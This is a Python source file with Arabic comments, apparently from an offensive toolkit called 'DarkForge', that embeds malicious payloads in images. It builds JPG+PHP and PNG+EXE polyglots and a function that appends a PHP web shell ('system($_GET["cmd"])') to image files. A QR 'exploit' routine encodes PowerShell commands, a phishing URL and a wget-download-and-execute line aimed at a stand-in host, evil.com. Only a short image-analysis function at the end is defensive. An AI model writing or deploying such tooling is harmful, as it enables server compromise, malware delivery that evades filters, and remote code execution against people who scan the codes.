#!/usr/bin/env python3
"""
Image Steganography Engine - محرك إخفاء البايلودات في الصور
يدعم 8 تقنيات مختلفة
"""

import os
import io
import zlib
import struct
import random
import base64
from typing import Dict, List, Optional, Tuple, Union
from PIL import Image
import numpy as np


class ImageSteganographyEngine:
    """محرك إخفاء البايلودات في الصور"""
    
    def __init__(self):
        self.techniques = {
            "lsb": self.lsb_encode,
            "metadata": self.metadata_encode,
            "polyglot": self.polyglot_encode,
            "pixel_encoding": self.pixel_encoding_encode,
            "palette": self.palette_encode,
            "idat": self.idat_encode,
            "dct": self.dct_encode,
            "qr_exploit": self.qr_exploit_encode
        }
    
    def encode(self, technique: str, image_path: str, payload_path: str, output_path: str, **kwargs) -> str:
        """تشفير بايلود في صورة باستخدام التقنية المختارة"""
        if technique not in self.techniques:
            raise ValueError(f"تقنية غير معروفة: {technique}")
        
        return self.techniques[technique](image_path, payload_path, output_path, **kwargs)
    
    def decode(self, technique: str, image_path: str, output_path: str = None, **kwargs) -> bytes:
        """فك تشفير بايلود من صورة"""
        # TODO: تنفيذ فك التشفير لكل تقنية
        pass
    
    # ==================== التقنية 1: LSB Steganography ====================
    
    def lsb_encode(self, image_path: str, payload_path: str, output_path: str, 
                   bits_per_channel: int = 1, encrypt: bool = False, password: str = None) -> str:
        """
        إخفاء بايلود في Least Significant Bits
        - يدعم الصور PNG, BMP, JPG
        - إمكانية تشفير البايلود قبل الإخفاء
        """
        print(f"[*] Loading image: {image_path}")
        img = Image.open(image_path)
        
        # تحويل إلى RGB
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = np.array(img)
        height, width, channels = pixels.shape
        
        # قراءة البايلود
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        # تشفير البايلود إن لزم
        if encrypt and password:
            payload_data = self._xor_encrypt(payload_data, password)
        
        # إضافة header: طول البايلود (4 بايت) + نوع الملف (10 بايت)
        payload_name = os.path.basename(payload_path).encode()[:50].ljust(50, b'\x00')
        payload_header = struct.pack('>I', len(payload_data)) + payload_name
        full_payload = payload_header + payload_data
        
        # تحويل البايلود إلى bits
        bits = []
        for byte in full_payload:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        
        # التأكد من أن الصورة كبيرة كفاية
        max_bits = (height * width * channels * bits_per_channel) // 8 - 100
        if len(full_payload) > max_bits:
            # ضغط البايلود
            compressed = zlib.compress(full_payload)
            payload_header = struct.pack('>I', len(compressed)) + b'[COMPRESSED]'.ljust(50, b'\x00')
            full_payload = payload_header + compressed
        
        bits = []
        for byte in full_payload:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        
        if len(bits) > height * width * channels:
            raise ValueError(f"الصورة صغيرة جدًا! تحتاج {len(bits)} بت لكن الصورة فيها {height * width * channels} بت فقط")
        
        # إخفاء البتات في الصورة
        bit_idx = 0
        for y in range(height):
            for x in range(width):
                for c in range(channels):
                    if bit_idx < len(bits):
                        # مسح آخر bits_per_channel بتات
                        pixels[y, x, c] = (pixels[y, x, c] & ~(2**bits_per_channel - 1))
                        # إخفاء البتات
                        mask = 0
                        for b in range(bits_per_channel):
                            if bit_idx < len(bits):
                                mask |= (bits[bit_idx] << (bits_per_channel - 1 - b))
                                bit_idx += 1
                        pixels[y, x, c] |= mask
        
        # حفظ الصورة الناتجة
        result_img = Image.fromarray(pixels)
        
        if output_path.lower().endswith('.jpg') or output_path.lower().endswith('.jpeg'):
            # JPEG يغير البيكسلات، نخزن كـ PNG للحفاظ على البيانات
            alt_output = output_path.rsplit('.', 1)[0] + '.png'
            result_img.save(alt_output, 'PNG')
            print(f"[!] تم حفظ كـ PNG بدلاً من JPG للحفاظ على البيانات: {alt_output}")
            return alt_output
        else:
            result_img.save(output_path)
            print(f"[+] تم حفظ الصورة مع البايلود: {output_path}")
        
        # حفظ معلومات الـ payload
        info_file = output_path + '.info'
        with open(info_file, 'w') as f:
            f.write(f"Original Image: {image_path}\n")
            f.write(f"Payload File: {payload_path}\n")
            f.write(f"Payload Size: {len(payload_data)} bytes\n")
            f.write(f"Technique: LSB ({bits_per_channel} bits per channel)\n")
            f.write(f"Encrypted: {encrypt}\n")
            f.write(f"Bits Embedded: {bit_idx}\n")
            f.write(f"Capacity: {len(bits)} / {height * width * channels* bits_per_channel}\n")
        
        print(f"[+] تم حفظ معلومات الاستخراج: {info_file}")
        return output_path
    
    def lsb_decode(self, image_path: str, output_dir: str = ".", password: str = None) -> str:
        """استخراج البايلود من صورة LSB"""
        img = Image.open(image_path)
        
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = np.array(img)
        height, width, channels = pixels.shape
        
        # استخراج البتات
        bits = []
        for y in range(height):
            for x in range(width):
                for c in range(channels):
                    bits.append(pixels[y, x, c] & 1)
        
        # تحويل البتات إلى بايتات
        bytes_data = bytearray()
        for i in range(0, len(bits), 8):
            if i + 8 <= len(bits):
                byte = 0
                for j in range(8):
                    byte = (byte << 1) | bits[i + j]
                bytes_data.append(byte)
        
        # قراءة الهيدر
        if len(bytes_data) < 54:
            raise ValueError("البيانات غير كافية لاستخراج البايلود")
        
        payload_size = struct.unpack('>I', bytes_data[0:4])[0]
        payload_name = bytes_data[4:54].rstrip(b'\x00').decode(errors='replace')
        
        if payload_name == '[COMPRESSED]':
            compressed_data = bytes_data[54:54+payload_size]
            full_payload = zlib.decompress(compressed_data)
            payload_size = struct.unpack('>I', full_payload[0:4])[0]
            payload_name = full_payload[4:54].rstrip(b'\x00').decode(errors='replace')
            payload_data = full_payload[54:54+payload_size]
        else:
            payload_data = bytes_data[54:54+payload_size]
        
        if password:
            payload_data = self._xor_encrypt(payload_data, password)
        
        output_path = os.path.join(output_dir, f"extracted_{payload_name}")
        with open(output_path, 'wb') as f:
            f.write(payload_data)
        
        print(f"[+] تم استخراج البايلود: {output_path}")
        print(f"    الحجم: {len(payload_data)} بايت")
        
        return output_path
    
    # ==================== التقنية 2: إخفاء في Metadata ====================
    
    def metadata_encode(self, image_path: str, payload_path: str, output_path: str) -> str:
        """
        إخفاء البايلود في بيانات EXIF/Metadata الخاصة بالصورة
        يستغل حقول EXIF غير المستخدمة
        """
        from PIL import Image
        from PIL.PngImagePlugin import PngInfo
        from PIL.ExifTags import Base
        
        img = Image.open(image_path)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        payload_b64 = base64.b64encode(payload).decode()
        
        # PNG metadata
        if image_path.lower().endswith('.png'):
            metadata = PngInfo()
            
            # إخفاء في حقول متعددة
            chunks = [payload_b64[i:i+100] for i in range(0, len(payload_b64), 100)]
            
            metadata.add_text("Comment", f"DarkForge:{len(payload)}:{len(chunks)}")
            for i, chunk in enumerate(chunks):
                metadata.add_text(f"XML:com.adobe.xmp_{i}", chunk)
            
            img.save(output_path, 'PNG', pnginfo=metadata)
        
        # JPEG EXIF
        elif image_path.lower().endswith(('.jpg', '.jpeg')):
            # حفظ EXIF الأصلي
            exif = img.getexif()
            
            # إضافة بياناتنا في حقول مخصصة
            # حقول MakerNote عادةً ما يتم تجاهلها
            exif[0x927C] = f"DarkForge:{len(payload)}".encode() + b'\x00'
            
            # إخفاء في حقول Artist و Copyright
            exif[0x013B] = base64.b64encode(payload[:100]).decode()  # Artist
            exif[0x8298] = f"DarkForge_{os.path.basename(payload_path)}"  # Copyright
            
            # حفظ مع EXIF
            img.save(output_path, 'JPEG', exif=exif.tobytes())
        
        else:
            # BMP, TIFF - حفظ كـ PNG بدلاً
            alt_output = output_path.rsplit('.', 1)[0] + '.png'
            metadata = PngInfo()
            metadata.add_text("Comment", f"DarkForge:{len(payload)}")
            metadata.add_text("payload", payload_b64)
            img.save(alt_output, 'PNG', pnginfo=metadata)
            output_path = alt_output
            print(f"[!] تم الحفظ كـ PNG بدلاً من BMP")
        
        print(f"[+] تم إخفاء البايلود في Metadata: {output_path}")
        return output_path
    
    def metadata_decode(self, image_path: str, output_path: str = None) -> str:
        """استخراج بايلود من Metadata"""
        img = Image.open(image_path)
        
        if output_path is None:
            output_path = "extracted_payload.bin"
        
        # PNG
        if image_path.lower().endswith('.png'):
            metadata = img.info
            
            if "Comment" in metadata and metadata["Comment"].startswith("DarkForge:"):
                parts = metadata["Comment"].split(":")
                payload_size = int(parts[1])
                num_chunks = int(parts[2])
                
                payload_b64 = ""
                for i in range(num_chunks):
                    key = f"XML:com.adobe.xmp_{i}"
                    if key in metadata:
                        payload_b64 += metadata[key]
                
                payload = base64.b64decode(payload_b64)
                
                with open(output_path, 'wb') as f:
                    f.write(payload)
                
                print(f"[+] تم استخراج البايلود: {output_path}")
                return output_path
        
        # JPEG
        elif image_path.lower().endswith(('.jpg', '.jpeg')):
            exif = img.getexif()
            
            if 0x927C in exif:
                marker = exif[0x927C]
                if isinstance(marker, bytes) and marker.startswith(b"DarkForge:"):
                    # استخراج البايلود من حقول EXIF
                    # (تنفيذ مبسط - في الواقع يحتاج تحليل أعمق)
                    payload_b64 = exif.get(0x013B, "")
                    if payload_b64:
                        payload = base64.b64decode(payload_b64)
                        with open(output_path, 'wb') as f:
                            f.write(payload)
                        return output_path
        
        return None
    
    # ==================== التقنية 3: Polyglot Files ====================
    
    def polyglot_encode(self, image_path: str, payload_path: str, output_path: str, 
                        format_type: str = "gif+zip") -> str:
        """
        إنشاء ملفات Polyglot - ملف واحد يعمل كصورة وأيضاً كملف تنفيذي/أرشيف
        GIF+ZIP: يعرض كصورة GIF ويمكن فتحه كـ ZIP
        PNG+EXE: يعمل كصورة PNG وكـ EXE في نفس الوقت
        JPG+PHP: صورة JPG تعمل كـ PHP web shell
        """
        with open(image_path, 'rb') as f:
            image_data = f.read()
        
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        if format_type == "gif+zip":
            # GIF header + ZIP data
            # GIF starts with "GIF89a" or "GIF87a"
            # ZIP starts with PK\x03\x04
            # نضيف ZIP comment بعد نهاية ملف GIF
            
            # إيجاد نهاية GIF
            gif_end = image_data.rfind(b'\x00\x3B')
            if gif_end == -1:
                gif_end = len(image_data)
            else:
                gif_end += 2
            
            # بناء polyglot
            result = image_data[:gif_end]
            result += payload_data  # ZIP file
            result += image_data[gif_end:]  # باقي GIF إن وجد
            
            # إذا ما عندنا ZIP، نحول البايلود إلى ZIP
            if not payload_data.startswith(b'PK\x03\x04'):
                import zipfile
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr('payload', payload_data)
                result = image_data[:gif_end] + zip_buffer.getvalue()
            
        elif format_type == "png+exe":
            # PNG magic: \x89PNG
            # EXE magic: MZ
            # نضيف EXE header قبل PNG
            
            # PNG chunks
            result = b'MZ\x90\x00'  # EXE header
            result += payload_data[2:] if payload_data[:2] == b'MZ' else payload_data
            result += b'\x00' * 100  # padding
            result += image_data  # PNG data
            
        elif format_type == "jpg+php":
            # JPG + PHP shell
            php_code = f'<?php system($_GET["cmd"]); ?>'.encode()
            
            # إخفاء PHP code في JPG comments
            jpg_data = image_data
            
            # إضافة Comment marker (FF FE)
            comment = b'\xFF\xFE' + struct.pack('>H', len(php_code) + 2) + php_code
            result = jpg_data[:2] + comment + jpg_data[2:]
            
            # إضافة Web Shell في نهاية الملف
            result += b'\n<?php system($_GET["c"]); /*DarkForge*/ ?>'
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        print(f"[+] تم إنشاء ملف Polyglot ({format_type}): {output_path}")
        return output_path
    
    # ==================== التقنية 4: Pixel Encoding ====================
    
    def pixel_encoding_encode(self, image_path: str, payload_path: str, output_path: str,
                              method: str = "rgb_values") -> str:
        """
        إخفاء بايلود في قيم البيكسلات مباشرة
        - يحول البايلود إلى ألوان بيكسلات
        - كل 3 بايتات = بيكسل واحد (R, G, B)
        - يضيف البيكسلات في منطقة محددة من الصورة
        """
        img = Image.open(image_path)
        
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = np.array(img)
        height, width, channels = pixels.shape
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        # تجهيز البايلود للإخفاء
        payload_len = len(payload)
        len_bytes = struct.pack('>I', payload_len)
        full_payload = len_bytes + payload
        
        # عدد البيكسلات المطلوبة
        num_pixels = (len(full_payload) + 2) // 3
        
        # إيجاد منطقة آمنة للإخفاء (على الحواف)
        margin = 50
        safe_width = width - 2 * margin
        safe_height = min(num_pixels // safe_width + 1, height - 2 * margin)
        
        if safe_height < 1:
            raise ValueError("الصورة صغيرة جدًا للبايلود")
        
        # إخفاء البايلود في البيكسلات
        pixel_idx = 0
        for i in range(0, len(full_payload), 3):
            if pixel_idx >= safe_width * safe_height:
                break
            
            y = margin + (pixel_idx // safe_width)
            x = margin + (pixel_idx % safe_width)
            
            r = full_payload[i] if i < len(full_payload) else 0
            g = full_payload[i+1] if i+1 < len(full_payload) else 0
            b = full_payload[i+2] if i+2 < len(full_payload) else 0
            
            pixels[y, x] = [r, g, b]
            pixel_idx += 1
        
        result_img = Image.fromarray(pixels)
        result_img.save(output_path)
        
        print(f"[+] تم إخفاء البايلود في بيكسلات الصورة: {output_path}")
        print(f"    المنطقة: ({margin}, {margin}) إلى ({margin + safe_width}, {margin + safe_height})")
        print(f"    البيكسلات المستخدمة: {pixel_idx}")
        
        # حفظ معلومات الموقع
        info = f"{margin}:{margin}:{safe_width}:{safe_height}:{payload_len}"
        info_path = output_path + '.pxl'
        with open(info_path, 'w') as f:
            f.write(info)
        
        return output_path
    
    # ==================== التقنية 5: Palette Manipulation ====================
    
    def palette_encode(self, image_path: str, payload_path: str, output_path: str) -> str:
        """
        إخفاء بايلود في لوحة ألوان الصورة (Palette)
        - مخصص للصور ذات الألوان المحدودة (GIF, PNG-8)
        - يغير ترتيب الألوان في اللوحة
        """
        img = Image.open(image_path)
        
        # تحويل إلى صورة palette
        if img.mode != 'P':
            img = img.quantize(colors=256)
        
        # الحصول على اللوحة
        palette = img.getpalette()
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        # البايلود كـ base64
        payload_b64 = base64.b64encode(payload).decode()
        
        # إخفاء البايلود في اللوحة
        # كل 3 بايتات من اللوحة تمثل لون (R, G, B)
        # نستبدل أول عدد من الألوان بالبايلود
        
        payload_bytes = payload_b64.encode() + b'\x00\x00\x00'  # padding
        max_colors = min(len(payload_bytes) // 3, 256)
        
        # إخفاء طول البايلود في أول لونين
        palette[0:3] = [len(payload) & 0xFF, (len(payload) >> 8) & 0xFF, (len(payload) >> 16) & 0xFF]
        palette[3:6] = [(len(payload) >> 24) & 0xFF, 0, 0]  # Magic marker
        
        for i in range(max_colors):
            idx = 6 + i * 3
            if idx + 2 < len(payload_bytes):
                palette[idx] = payload_bytes[i * 3] if i * 3 < len(payload_bytes) else 0
                palette[idx+1] = payload_bytes[i * 3 + 1] if i * 3 + 1 < len(payload_bytes) else 0
                palette[idx+2] = payload_bytes[i * 3 + 2] if i * 3 + 2 < len(payload_bytes) else 0
        
        # إنشاء صورة جديدة باللوحة المعدلة
        new_img = Image.new('P', img.size)
        new_img.putpalette(palette)
        new_img.putdata(list(img.getdata()))
        
        new_img.save(output_path)
        
        print(f"[+] تم إخفاء البايلود في لوحة الألوان: {output_path}")
        return output_path
    
    # ==================== التقنية 6: IDAT Chunk Exploit ====================
    
    def idat_encode(self, image_path: str, payload_path: str, output_path: str) -> str:
        """
        إخفاء بايلود في IDAT chunks الخاصة بصيغة PNG
        - IDAT تحتوي على بيانات الصورة المضغوطة
        - نضيف IDAT chunks إضافية
        """
        with open(image_path, 'rb') as f:
            png_data = f.read()
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        if png_data[:8] != b'\x89PNG\r\n\x1a\n':
            raise ValueError("الملف ليس بصيغة PNG")
        
        # ضغط البايلود
        compressed = zlib.compress(payload)
        
        # إنشاء IDAT chunk
        chunk_type = b'IDAT'
        chunk_data = compressed
        chunk_len = struct.pack('>I', len(chunk_data))
        chunk_crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF)
        new_chunk = chunk_len + chunk_type + chunk_data + chunk_crc
        
        # إضافة الـ chunk بعد آخر IDAT
        # أو قبل IEND chunk
        iend_pos = png_data.rfind(b'IEND')
        if iend_pos == -1:
            iend_pos = len(png_data) - 12
        
        # إيجاد موضع الإدراج (قبل IEND)
        insert_pos = iend_pos - 4  # قبل طول IEND
        
        result = png_data[:insert_pos] + new_chunk + png_data[insert_pos:]
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        print(f"[+] تم إخفاء البايلود في IDAT chunk: {output_path}")
        print(f"    حجم الـ chunk المضاف: {len(new_chunk)} بايت")
        
        return output_path
    
    # ==================== التقنية 7: DCT Coefficient Encoding ====================
    
    def dct_encode(self, image_path: str, payload_path: str, output_path: str,
                   quality: int = 95) -> str:
        """
        إخفاء بايلود في معاملات DCT (JPEG)
        - يستغل JPEG compression
        - يعدل معاملات DCT بشكل طفيف
        """
        # هذه التقنية تحتاج مكتبة jpeglib أو pyjpeg
        # تنفيذ مبسط
        print("[*] DCT encoding requires jpeglib library")
        print("[*] استخدم تقنية LSB بدلاً من ذلك")
        
        # للتبسيط، استخدام LSB
        return self.lsb_encode(image_path, payload_path, output_path, bits_per_channel=2)
    
    # ==================== التقنية 8: QR Code Exploit ====================
    
    def qr_exploit_encode(self, image_path: str, payload_path: str, output_path: str,
                          website_url: str = "http://evil.com") -> str:
        """
        إنشاء QR Code يحتوي على بايلود
        - QR code يوجه لموقع تصيد
        - أو يحتوي على نص برمجي
        - أو أمر يتم تنفيذه
        """
        try:
            import qrcode
        except ImportError:
            print("[!] مكتبة qrcode غير مثبتة. قم بتثبيتها: pip install qrcode[pil]")
            return None
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        # تحويل البايلود إلى أمر
        payload_b64 = base64.b64encode(payload).decode()
        
        # إنشاء QR Code payloads متعددة
        qr_payloads = [
            f"powershell -e {payload_b64}",
            f"cmd /c echo {payload_b64} | base64 -d | powershell -",
            website_url + "?p=" + payload_b64[:50],
            f"wget {website_url}/p -O /tmp/p && chmod +x /tmp/p && /tmp/p"
        ]
        
        # اختيار أول payload
        chosen_payload = qr_payloads[0]
        
        # إنشاء QR Code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(chosen_payload)
        qr.make(fit=True)
        
        qr_img = qr.make_image(fill_color="black", back_color="white")
        
        # دمج QR Code مع الصورة الأصلية
        if image_path:
            bg_img = Image.open(image_path)
            
            # تغيير حجم QR
            qr_size = min(bg_img.width, bg_img.height) // 3
            qr_img = qr_img.resize((qr_size, qr_size))
            
            # لصق QR في الزاوية
            bg_img.paste(qr_img, (bg_img.width - qr_size - 20, 20))
            bg_img.save(output_path)
        else:
            qr_img.save(output_path)
        
        print(f"[+] تم إنشاء QR Code exploit: {output_path}")
        print(f"    البيانات المخفية: {chosen_payload[:50]}...")
        print(f"    امسح QR code باستخدام الهاتف لاختباره")
        
        return output_path
    
    # ==================== أدوات مساعدة ====================
    
    def _xor_encrypt(self, data: bytes, password: str) -> bytes:
        """تشفير XOR بسيط"""
        key = password.encode()
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)
    
    def hide_payload_in_image(self, image_path: str, payload_path: str, output_path: str,
                             technique: str = "lsb") -> str:
        """واجهة موحدة لإخفاء بايلود في صورة"""
        return self.encode(technique, image_path, payload_path, output_path)
    
    def create_image_shell(self, image_path: str, output_path: str, 
                          shell_type: str = "php") -> str:
        """إنشاء Web Shell داخل صورة"""
        if shell_type == "php":
            shell_code = b'<?php system($_GET["cmd"]); ?>'
        
        with open(image_path, 'rb') as f:
            img_data = f.read()
        
        # إضافة shell code في نهاية الصورة
        result = img_data + b'\n' + shell_code
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        print(f"[+] تم إنشاء Image Shell ({shell_type}): {output_path}")
        return output_path
    
    def analyze_image(self, image_path: str) -> dict:
        """تحليل صورة للبحث عن بيانات مخفية"""
        analysis = {
            "file": image_path,
            "size": os.path.getsize(image_path),
            "techniques_detected": []
        }
        
        img = Image.open(image_path)
        analysis["format"] = img.format
        analysis["mode"] = img.mode
        analysis["dimensions"] = f"{img.width}x{img.height}"
        
        # فحص Metadata
        if img.format == 'PNG':
            if "Comment" in img.info:
                analysis["techniques_detected"].append("LSB/Metadata")
                analysis["metadata_found"] = img.info["Comment"][:100]
        
        # فحص EXIF
        exif = img.getexif()
        if exif:
            analysis["has_exif"] = True
            for tag_id in [0x927C, 0x013B, 0x8298]:
                if tag_id in exif:
                    analysis["techniques_detected"].append("EXIF/JPEG Metadata")
        
        # فحص Polyglot
        with open(image_path, 'rb') as f:
            data = f.read()
        
        if data.startswith(b'GIF89a') or data.startswith(b'GIF87a'):
            # تحقق من وجود ZIP بعد GIF
            if b'PK\x03\x04' in data:
                analysis["techniques_detected"].append("GIF+ZIP Polyglot")
        
        if b'<?php' in data or b'<%' in data:
            analysis["techniques_detected"].append("Image Shell (PHP/ASP)")
        
        # فحص IDAT
        if img.format == 'PNG':
            # عدد IDAT chunks
            idat_count = data.count(b'IDAT')
            if idat_count > 10:
                analysis["techniques_detected"].append(f"IDAT Chunks ({idat_count})")
        
        return analysis
